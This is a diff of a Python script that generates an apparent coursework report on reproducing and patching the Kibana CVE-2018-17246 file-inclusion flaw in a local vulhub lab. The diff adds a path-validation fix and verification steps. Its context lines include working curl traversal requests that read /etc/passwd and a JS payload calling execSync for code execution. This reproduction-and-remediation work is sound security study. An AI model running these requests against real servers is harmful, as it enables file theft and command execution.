@@ -266,11 +266,11 @@ def main():
          "curl -s -o /dev/null -w \"%{http_code}\\n\" \\\n"
          "  \"http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\\\n"
          "&apis=../../../../../../../../../../../etc/passwd\"")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "02_lfi_request.png"), 6.0)
+    add_image(doc, os.path.join(CVE_EVIDENCE, "05_lfi_request.png"), 6.0)
     body(doc,
          "The HTTP response itself only contains a 500 error, but the Kibana log shows that "
          "/etc/passwd was successfully included:")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "03_lfi_logs.png"), 6.2)
+    add_image(doc, os.path.join(CVE_EVIDENCE, "06_lfi_logs.png"), 6.2)
     heading(doc, "7.2 Reproducing command execution", 2)
     body(doc,
          "An attacker able to upload a file (for example through a separate upload feature) can include "
@@ -280,8 +280,8 @@ def main():
          "{return require(\"child_process\").execSync(\"id\").toString()}}\\' > /tmp/vulhub.js'\n"
          "curl -s \"http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\\\n"
          "&apis=../../../../../../../../../../../tmp/vulhub.js\"")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "04_rce_request.png"), 6.0)
-    add_image(doc, os.path.join(CVE_EVIDENCE, "05_rce_result.png"), 6.0)
+    add_image(doc, os.path.join(CVE_EVIDENCE, "03_rce_request.png"), 6.0)
+    add_image(doc, os.path.join(CVE_EVIDENCE, "04_rce_result.png"), 6.0)
 
     # ---------------- 8. Root cause ----------------
     heading(doc, "8. Root Cause Analysis")
@@ -303,26 +303,40 @@ def main():
     # ---------------- 9. Fix ----------------
     heading(doc, "9. Applied Fix and Verification")
     body(doc,
-         "The fix is a version upgrade of the Kibana container to the patched release 5.6.13 "
-         "(Elastic fixed CVE-2018-17246 in 5.6.13 / 6.4.3 by adding strict validation of the apis "
-         "parameter). The file docker-compose.yml was changed:")
+         "The root cause is in the Console plugin code: the apis parameter is concatenated into "
+         "require() without normalizing/restricting the resolved path. The fix is therefore a code "
+         "change in that plugin (the same change Elastic shipped in Kibana 5.6.13 / 6.4.3): before "
+         "the module is loaded the requested path is resolved and anything that leaves the api_server "
+         "directory is rejected. The patched file is CVE-2018-17246/patched/api_server/server.js and "
+         "docker-compose.fixed.yml mounts it read-only over the vulnerable file, so the rest of the "
+         "deployment is unchanged.")
     code(doc,
-         "-   image: vulhub/kibana:5.6.12\n"
-         "+   image: docker.elastic.co/kibana/kibana:5.6.13")
+         "-   let api = require('./' + name);\n"
+         "+   let resolved = path.resolve(API_DIR, './' + name);\n"
+         "+   if (resolved !== API_DIR && !resolved.startsWith(API_DIR + path.sep)) {\n"
+         "+     throw new Error('Invalid API path: ' + name);\n"
+         "+   }\n"
+         "+   let api = require(resolved);")
     code(doc,
-         "docker compose down\n"
-         "docker compose up -d   # fixed image 5.6.13")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "06_fix_compose.png"), 6.0)
+         "cd CVE-2018-17246\n"
+         "docker compose -f docker-compose.fixed.yml up -d   # patched server.js mounted over 5.6.12")
+    body(doc,
+         "Note: the official docker.elastic.co/kibana/kibana:5.6.13 image is x86_64-only; on this ARM "
+         "macOS host it runs only under QEMU emulation (no practical startup). The verification "
+         "therefore applies the equivalent 5.6.13 code fix (backport) on the natively runnable "
+         "vulhub/kibana:5.6.12 image - the same guard, the same file, the same endpoint.")
+    add_image(doc, os.path.join(CVE_EVIDENCE, "07_fix_compose.png"), 6.0)
     heading(doc, "9.1 The attack no longer works", 2)
     body(doc,
-         "The same exploitation request is sent to the fixed version; the request is rejected and no "
-         "file content is returned:")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "07_lfi_after_fix.png"), 6.0)
+         "The same LFI and RCE requests are sent to the patched deployment. Both are rejected by the "
+         "path check, no file content is read and no command is executed (the log no longer contains "
+         "the /etc/passwd syntax error):")
+    add_image(doc, os.path.join(CVE_EVIDENCE, "08_lfi_after_fix.png"), 6.0)
     heading(doc, "9.2 Regression testing", 2)
     body(doc,
-         "The Kibana web interface still loads and is fully functional after the upgrade (the "
-         "application starts, responds with HTTP 200 and the page is rendered):")
-    add_image(doc, os.path.join(CVE_EVIDENCE, "08_regression_ui.png"), 6.2)
+         "The Kibana web interface still loads and is fully functional after the fix (the application "
+         "starts, responds with HTTP 200 and the page is rendered):")
+    add_image(doc, os.path.join(CVE_EVIDENCE, "09_regression_ui.png"), 6.2)
 
     # ---------------- 10. Control questions ----------------
     heading(doc, "10. Answers to Control Questions")
